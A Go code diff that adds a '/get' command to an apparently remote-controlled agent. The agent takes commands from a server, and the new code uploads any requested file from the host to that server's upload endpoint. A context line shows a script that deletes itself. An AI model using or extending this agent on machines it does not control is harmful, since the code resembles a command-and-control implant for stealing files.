@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"os/exec"
@@ -540,6 +541,73 @@ func processCommands(commands []Command) {
 			return
 		}
 		
+		// Handle /get command (upload file from client to server)
+		if strings.HasPrefix(cmdStr, "/get ") {
+			// Extract file path, handling quoted paths with spaces
+			filePath := strings.TrimSpace(strings.TrimPrefix(cmdStr, "/get "))
+			
+			// Remove surrounding quotes if present (both single and double)
+			filePath = strings.Trim(filePath, `"'`)
+			
+			if filePath == "" {
+				result := CommandResult{
+					Status:   "failed",
+					Error:    "Usage: /get <filepath>",
+					ExitCode: intPtr(1),
+				}
+				submitResult(cmd.ID, result)
+				continue
+			}
+			
+			// Resolve path relative to current directory if not absolute
+			var absPath string
+			if filepath.IsAbs(filePath) {
+				absPath = filePath
+			} else {
+				absPath = filepath.Join(currentDir, filePath)
+			}
+			absPath = filepath.Clean(absPath)
+			
+			// Check if file exists
+			if info, err := os.Stat(absPath); err != nil {
+				result := CommandResult{
+					Status:   "failed",
+					Error:    fmt.Sprintf("File not found: %s (resolved to: %s)", filePath, absPath),
+					ExitCode: intPtr(1),
+				}
+				submitResult(cmd.ID, result)
+				log.Printf("File not found - requested: %s, resolved: %s, currentDir: %s", filePath, absPath, currentDir)
+				continue
+			} else if info.IsDir() {
+				result := CommandResult{
+					Status:   "failed",
+					Error:    fmt.Sprintf("Path is a directory, not a file: %s", filePath),
+					ExitCode: intPtr(1),
+				}
+				submitResult(cmd.ID, result)
+				continue
+			}
+			
+			// Upload file to server
+			if err := uploadFile(absPath, filePath); err != nil {
+				result := CommandResult{
+					Status:   "failed",
+					Error:    fmt.Sprintf("Failed to upload file: %v", err),
+					ExitCode: intPtr(1),
+				}
+				submitResult(cmd.ID, result)
+				continue
+			}
+			
+			result := CommandResult{
+				Status:   "completed",
+				Result:   fmt.Sprintf("File uploaded successfully: %s", filePath),
+				ExitCode: intPtr(0),
+			}
+			submitResult(cmd.ID, result)
+			continue
+		}
+		
 		// Handle cd command (change directory)
 		if strings.HasPrefix(cmdStr, "cd ") || cmdStr == "cd" {
 			parts := strings.Fields(cmdStr)
@@ -841,4 +909,64 @@ rm -f "$0" 2>/dev/null
 		
 		return nil
 	}
+}
+
+func uploadFile(filePath, originalPath string) error {
+	// Open the file
+	file, err := os.Open(filePath)
+	if err != nil {
+		return fmt.Errorf("failed to open file: %w", err)
+	}
+	defer file.Close()
+	
+	// Create multipart form
+	var requestBody bytes.Buffer
+	writer := multipart.NewWriter(&requestBody)
+	
+	// Add file
+	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
+	if err != nil {
+		return fmt.Errorf("failed to create form file: %w", err)
+	}
+	
+	_, err = io.Copy(part, file)
+	if err != nil {
+		return fmt.Errorf("failed to copy file data: %w", err)
+	}
+	
+	// Add file path
+	writer.WriteField("file_path", originalPath)
+	
+	// Close writer
+	err = writer.Close()
+	if err != nil {
+		return fmt.Errorf("failed to close writer: %w", err)
+	}
+	
+	// Create request
+	req, err := http.NewRequest("POST", fmt.Sprintf("%s/api/hosts/%s/upload", serverURL, hostID), &requestBody)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %w", err)
+	}
+	
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	
+	// Send request
+	client := &http.Client{
+		Timeout: 60 * time.Second, // Longer timeout for file uploads
+	}
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to upload file: %w", err)
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("upload failed: %s - %s", resp.Status, string(body))
+	}
+	
+	log.Printf("File uploaded successfully: %s", originalPath)
+	return nil
 }
